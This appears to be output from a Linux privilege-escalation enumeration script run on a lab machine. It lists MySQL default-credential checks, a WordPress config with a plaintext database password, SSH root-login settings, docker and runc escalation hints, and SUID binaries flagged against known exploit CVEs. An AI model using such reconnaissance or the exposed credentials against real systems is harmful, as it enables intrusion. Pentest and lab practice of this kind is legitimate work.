/snap/core/9665/usr/share/gcc-5
/usr/share/gcc-8

╔══════════╣ MySQL version
mysql  Ver 14.14 Distrib 5.7.31, for Linux (x86_64) using  EditLine wrapper


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No
═╣ MySQL connection using root/NOPASS ................. No

╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)

-rw------- 1 root root 317 Aug  3  2020 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.29 (Ubuntu)
Server built:   2020-03-13T12:26:16
httpd Not Found

Nginx version: nginx Not Found

/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/conf-enabled/phpmyadmin.conf-        <IfModule mod_mime.c>
/etc/apache2/conf-enabled/phpmyadmin.conf:            AddType application/x-httpd-php .php
--
/etc/apache2/conf-enabled/phpmyadmin.conf-        <FilesMatch ".+\.php$">
/etc/apache2/conf-enabled/phpmyadmin.conf:            SetHandler application/x-httpd-php
--
/etc/apache2/conf-enabled/phpmyadmin.conf-        <IfModule mod_mime.c>
/etc/apache2/conf-enabled/phpmyadmin.conf:            AddType application/x-httpd-php .php
--
/etc/apache2/conf-enabled/phpmyadmin.conf-        <FilesMatch ".+\.php$">
/etc/apache2/conf-enabled/phpmyadmin.conf:            SetHandler application/x-httpd-php
--
/etc/apache2/conf-available/phpmyadmin.conf-        <IfModule mod_mime.c>
/etc/apache2/conf-available/phpmyadmin.conf:            AddType application/x-httpd-php .php
--
/etc/apache2/conf-available/phpmyadmin.conf-        <FilesMatch ".+\.php$">
/etc/apache2/conf-available/phpmyadmin.conf:            SetHandler application/x-httpd-php
--
/etc/apache2/conf-available/phpmyadmin.conf-        <IfModule mod_mime.c>
/etc/apache2/conf-available/phpmyadmin.conf:            AddType application/x-httpd-php .php
--
/etc/apache2/conf-available/phpmyadmin.conf-        <FilesMatch ".+\.php$">
/etc/apache2/conf-available/phpmyadmin.conf:            SetHandler application/x-httpd-php
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Aug  3  2020 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Aug  3  2020 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 33 Aug  3  2020 /etc/apache2/sites-enabled/wordpress.conf -> ../sites-available/wordpress.conf
Alias /blog /var/www/html/wordpress
<Directory /var/www/html/wordpress>
    Options FollowSymLinks
    AllowOverride Limit Options FileInfo
    DirectoryIndex index.php
    Order allow,deny
    Allow from all
</Directory>
<Directory /var/www/html/wordpress/wp-content>
    Options FollowSymLinks
    Order allow,deny
    Allow from all
</Directory>
lrwxrwxrwx 1 root root 35 Aug  3  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Jul 16  2019 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Aug  3  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 71817 May 26  2020 /etc/php/7.2/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71429 May 26  2020 /etc/php/7.2/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 root root 3109 Aug  3  2020 /var/www/html/wordpress/wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'wordpress123' );
define( 'DB_HOST', 'localhost' );

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Aug  3  2020 /etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)





-rw-r--r-- 1 root root 603 Aug  3  2020 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 175 Aug  3  2020 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 95 Aug  3  2020 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 395 Aug  3  2020 /etc/ssh/ssh_host_rsa_key.pub

PermitRootLogin yes
PubkeyAuthentication yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/CA_Disig_Root_R2.pem
/etc/ssl/certs/CFCA_EV_ROOT.pem
/etc/ssl/certs/COMODO_Certification_Authority.pem
4872PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Aug  3  2020 /etc/pam.d
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 2.6


/tmp/tmux-1000
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3517 Jan 15  2020 /etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3612 Oct  4  2019 /snap/core/8268/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3517 Jan 16  2020 /snap/core/9665/etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 121 Dec  6  2019 /snap/core/8268/usr/share/keyrings
drwxr-xr-x 2 root root 121 Jul 10  2020 /snap/core/9665/usr/share/keyrings
drwxr-xr-x 2 root root 4096 Feb  3  2020 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /snap/core/8268/etc/pam.d/passwd
passwd file: /snap/core/8268/etc/passwd
passwd file: /snap/core/8268/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/8268/var/lib/extrausers/passwd
passwd file: /snap/core/9665/etc/pam.d/passwd
passwd file: /snap/core/9665/etc/passwd
passwd file: /snap/core/9665/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/9665/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 2796 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw------- 1 aubreanna aubreanna 1200 Aug  3  2020 /home/aubreanna/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 13395 Dec  6  2019 /snap/core/8268/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /snap/core/8268/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /snap/core/8268/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /snap/core/8268/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 15136 Jul 10  2020 /snap/core/9665/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 14076 Jun  3  2020 /snap/core/9665/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 Jun  3  2020 /snap/core/9665/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 Jun  3  2020 /snap/core/9665/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 3267 Jan 10  2019 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 /home/aubreanna/.gnupg

╔══════════╣ Checking if containerd(ctr) is available
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation
ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it
ctr: failed to dial "/run/containerd/containerd.sock": connection error: desc = "transport: error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied"

╔══════════╣ Checking if runc is available
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation
runc was found in /usr/sbin/runc, you may be able to escalate privileges with it

╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation
lrwxrwxrwx 1 root root 33 Aug  3  2020 /etc/systemd/system/sockets.target.wants/docker.socket -> /lib/systemd/system/docker.socket
total 0
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.io_merged
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.io_merged_recursive
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.io_queued
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.io_queued_recursive
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.io_service_bytes
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.io_service_bytes_recursive
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.io_service_time
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.io_service_time_recursive
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.io_serviced
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.io_serviced_recursive
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.io_wait_time
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.io_wait_time_recursive
-rw-r--r-- 1 root root 0 Jan 20 20:34 blkio.leaf_weight
-rw-r--r-- 1 root root 0 Jan 20 20:34 blkio.leaf_weight_device
--w------- 1 root root 0 Jan 20 20:34 blkio.reset_stats
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.sectors
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.sectors_recursive
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.throttle.io_service_bytes
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.throttle.io_serviced
-rw-r--r-- 1 root root 0 Jan 20 20:34 blkio.throttle.read_bps_device
-rw-r--r-- 1 root root 0 Jan 20 20:34 blkio.throttle.read_iops_device
-rw-r--r-- 1 root root 0 Jan 20 20:34 blkio.throttle.write_bps_device
-rw-r--r-- 1 root root 0 Jan 20 20:34 blkio.throttle.write_iops_device
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.time
-r--r--r-- 1 root root 0 Jan 20 20:34 blkio.time_recursive
-rw-r--r-- 1 root root 0 Jan 20 20:34 blkio.weight
-rw-r--r-- 1 root root 0 Jan 20 20:34 blkio.weight_device
-rw-r--r-- 1 root root 0 Jan 20 20:34 cgroup.clone_children
-rw-r--r-- 1 root root 0 Jan 20 20:34 cgroup.procs
-rw-r--r-- 1 root root 0 Jan 20 20:34 notify_on_release
-rw-r--r-- 1 root root 0 Jan 20 20:34 tasks
total 0
-rw-r--r-- 1 root root 0 Jan 20 20:34 cgroup.clone_children
-rw-r--r-- 1 root root 0 Jan 20 20:34 cgroup.procs
-rw-r--r-- 1 root root 0 Jan 20 20:34 cpu.cfs_period_us
-rw-r--r-- 1 root root 0 Jan 20 20:34 cpu.cfs_quota_us
-rw-r--r-- 1 root root 0 Jan 20 20:34 cpu.shares
-r--r--r-- 1 root root 0 Jan 20 20:34 cpu.stat
-r--r--r-- 1 root root 0 Jan 20 20:34 cpuacct.stat
-rw-r--r-- 1 root root 0 Jan 20 20:34 cpuacct.usage
-r--r--r-- 1 root root 0 Jan 20 20:34 cpuacct.usage_all
-r--r--r-- 1 root root 0 Jan 20 20:34 cpuacct.usage_percpu
-r--r--r-- 1 root root 0 Jan 20 20:34 cpuacct.usage_percpu_sys
-r--r--r-- 1 root root 0 Jan 20 20:34 cpuacct.usage_percpu_user
-r--r--r-- 1 root root 0 Jan 20 20:34 cpuacct.usage_sys
-r--r--r-- 1 root root 0 Jan 20 20:34 cpuacct.usage_user
-rw-r--r-- 1 root root 0 Jan 20 20:34 notify_on_release
-rw-r--r-- 1 root root 0 Jan 20 20:34 tasks
total 0
-rw-r--r-- 1 root root 0 Jan 20 20:34 cgroup.clone_children
-rw-r--r-- 1 root root 0 Jan 20 20:34 cgroup.procs
--w------- 1 root root 0 Jan 20 20:34 devices.allow
--w------- 1 root root 0 Jan 20 20:34 devices.deny
-r--r--r-- 1 root root 0 Jan 20 20:34 devices.list
-rw-r--r-- 1 root root 0 Jan 20 20:34 notify_on_release
-rw-r--r-- 1 root root 0 Jan 20 20:34 tasks
total 0
-rw-r--r-- 1 root root 0 Jan 20 20:34 cgroup.clone_children
--w--w--w- 1 root root 0 Jan 20 20:34 cgroup.event_control
-rw-r--r-- 1 root root 0 Jan 20 20:34 cgroup.procs
-rw-r--r-- 1 root root 0 Jan 20 20:34 memory.failcnt
--w------- 1 root root 0 Jan 20 20:34 memory.force_empty
-rw-r--r-- 1 root root 0 Jan 20 20:34 memory.kmem.failcnt
-rw-r--r-- 1 root root 0 Jan 20 20:34 memory.kmem.limit_in_bytes
-rw-r--r-- 1 root root 0 Jan 20 20:34 memory.kmem.max_usage_in_bytes
-r--r--r-- 1 root root 0 Jan 20 20:34 memory.kmem.slabinfo
-rw-r--r-- 1 root root 0 Jan 20 20:34 memory.kmem.tcp.failcnt
-rw-r--r-- 1 root root 0 Jan 20 20:34 memory.kmem.tcp.limit_in_bytes
-rw-r--r-- 1 root root 0 Jan 20 20:34 memory.kmem.tcp.max_usage_in_bytes
-r--r--r-- 1 root root 0 Jan 20 20:34 memory.kmem.tcp.usage_in_bytes
-r--r--r-- 1 root root 0 Jan 20 20:34 memory.kmem.usage_in_bytes
-rw-r--r-- 1 root root 0 Jan 20 20:34 memory.limit_in_bytes
-rw-r--r-- 1 root root 0 Jan 20 20:34 memory.max_usage_in_bytes
-rw-r--r-- 1 root root 0 Jan 20 20:34 memory.move_charge_at_immigrate
-r--r--r-- 1 root root 0 Jan 20 20:34 memory.numa_stat
-rw-r--r-- 1 root root 0 Jan 20 20:34 memory.oom_control
---------- 1 root root 0 Jan 20 20:34 memory.pressure_level
-rw-r--r-- 1 root root 0 Jan 20 20:34 memory.soft_limit_in_bytes
-r--r--r-- 1 root root 0 Jan 20 20:34 memory.stat
-rw-r--r-- 1 root root 0 Jan 20 20:34 memory.swappiness
-r--r--r-- 1 root root 0 Jan 20 20:34 memory.usage_in_bytes
-rw-r--r-- 1 root root 0 Jan 20 20:34 memory.use_hierarchy
-rw-r--r-- 1 root root 0 Jan 20 20:34 notify_on_release
-rw-r--r-- 1 root root 0 Jan 20 20:34 tasks
total 0
-rw-r--r-- 1 root root 0 Jan 20 20:34 cgroup.clone_children
-rw-r--r-- 1 root root 0 Jan 20 20:34 cgroup.procs
-rw-r--r-- 1 root root 0 Jan 20 20:34 notify_on_release
-rw-r--r-- 1 root root 0 Jan 20 20:34 tasks
total 0
-rw-r--r-- 1 root root 0 Jan 20 20:34 cgroup.clone_children
-rw-r--r-- 1 root root 0 Jan 20 20:34 cgroup.procs
-rw-r--r-- 1 root root 0 Jan 20 20:34 notify_on_release
-r--r--r-- 1 root root 0 Jan 20 20:34 pids.current
-r--r--r-- 1 root root 0 Jan 20 20:34 pids.events
-rw-r--r-- 1 root root 0 Jan 20 20:34 pids.max
-rw-r--r-- 1 root root 0 Jan 20 20:34 tasks
-rw-r--r-- 1 root root 0 Aug  3  2020 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/8268/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/9665/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing FTP Files (limit 70)



-rw-r--r-- 1 root root 69 May 26  2020 /etc/php/7.2/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 May 26  2020 /usr/share/php7.2-common/common/ftp.ini






╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind




╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r----- 1 root adm 21402134 Jan 20 20:32 /var/log/apache2/access.log

-rw-r----- 1 root adm 1867930 Jan 20 20:17 /var/log/apache2/error.log
-rw-r----- 1 mysql adm 208306 Jan 20 20:34 /var/log/mysql/error.log

╔══════════╣ Analyzing Windows Files (limit 70)






















lrwxrwxrwx 1 root root 20 Aug  3  2020 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 Aug  3  2020 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 81 Aug  3  2020 /var/lib/dpkg/alternatives/my.cnf





























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
-rwx------ 1 aubreanna aubreanna 3771 Apr  4  2018 /home/aubreanna/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/8268/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/9665/etc/skel/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rwx------ 1 aubreanna aubreanna 807 Apr  4  2018 /home/aubreanna/.profile
-rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/8268/etc/skel/.profile
-rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/9665/etc/skel/.profile



-rwx------ 1 aubreanna aubreanna 0 Aug  3  2020 /home/aubreanna/.sudo_as_admin_successful



                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found
-rwsr-xr-x 1 root root 40K Jan 27  2020 /snap/core/9665/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/9665/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/9665/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/9665/bin/su
-rwsr-xr-x 1 root root 27K Jan 27  2020 /snap/core/9665/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/9665/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/9665/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/9665/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/9665/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/9665/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Jan 31  2020 /snap/core/9665/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 11  2020 /snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K May 26  2020 /snap/core/9665/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 109K Jul 10  2020 /snap/core/9665/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Feb 11  2020 /snap/core/9665/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 40K Oct 10  2019 /snap/core/8268/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root root 27K Oct 10  2019 /snap/core/8268/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/8268/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/8268/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/8268/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Oct 11  2019 /snap/core/8268/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Jun 12  2018 /snap/core/8268/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 43K Mar  5  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 27K Mar  5  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 146K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 111K Jul 10  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

